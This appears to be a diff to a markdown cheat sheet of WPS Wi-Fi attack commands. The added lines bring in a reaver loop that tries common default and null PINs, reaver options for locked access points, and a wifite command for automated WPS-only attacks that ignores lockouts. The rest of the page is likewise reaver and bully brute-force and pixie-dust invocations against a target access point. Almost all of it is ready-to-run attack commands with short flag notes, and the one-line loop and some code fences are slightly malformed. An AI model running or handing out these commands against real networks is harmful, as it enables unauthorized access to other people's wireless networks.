@@ -37,6 +37,19 @@ Scan for WPS-enabled APs
    wash -i wlan1mon -c $channel
 ```
 
+
+Test common default PINs and Null PIN
+
+`default-pins.sh`
+
+```bash
+#!/bin/bash
+
+for pin in '' 12345670 00000000 11111111 01230123 31415926; do reaver -i wlan1mon -b $ap_mac -c $channel -f -N -g 1 -vv -p "$pin" done
+
+```
+
+
 Launch pixie dust attack
 
 `reaver1.sh`
@@ -45,15 +58,6 @@ Launch pixie dust attack
    reaver -i wlan1mon -b $ap_mac -c $channel -K 1 -N -vv
 ```
 
-Blank PIN to check for misconfigured APs
-
-`wps-null`
-
- ```
-reaver -i wlan1mon -b $ap_mac -c $channel -f -N -g 1 -vv -p ''
- ```
-
-
 Different implementation of a pixie dust attack
 
 `bully1.sh`
@@ -61,6 +65,20 @@ Different implementation of a pixie dust attack
 ```bash
 bully wlan1mon -b $ap_mac -c $channel -e $essid -d -v 4 -F -D -A -C -l 90 -w ~/.bully/
 ```
+
+For difficult/locked APs
+
+`reaver2.sh
+
+```bash
+#!/bin/bash
+# Reaver with EAP terminate and timeout-is-nack
+reaver -i wlan1mon -b $ap_mac -c $channel -L -N -E -J -vv -d 5 -w -S -A
+```
+
+- `-E`: EAP terminate after each session
+- `-J`: Treat timeout as NACK (for DIR-300/320 routers)
+
 
 Sequential brute force with checksum brute forcing
 
@@ -72,11 +90,28 @@ bully wlan1mon -b $ap_mac -c $channel -S -F -B -v 3
 
 Last resort brute force (slow)
 
-`reaver2.sh`
+`reaver3.sh`
 
 ```bash
 reaver -i wlan1mon -b $ap_mac -c $channel -e $ap_name -L -N -vv -d 15 -T 1 -r 2:60 -g 5 -x 60 -t 10 -w -S -A -s session_$ap_name.wpc
 ```
+
+
+Custom wifite settings for automated attacks
+
+`wifite-wps.sh
+
+```bash
+#!/bin/bash
+# Wifite with custom options
+wifite --wps-only --bully --ignore-locks --kill -i wlan1mon
+```
+
+- `--wps-only`: Only WPS attacks
+- `--pixie`: Force Pixie Dust (default enabled)
+- `--bully`: Use bully instead of reaver (optional)
+- `--ignore-locks`: Continue even if locked
+
 
 Known PIN to extract password
 
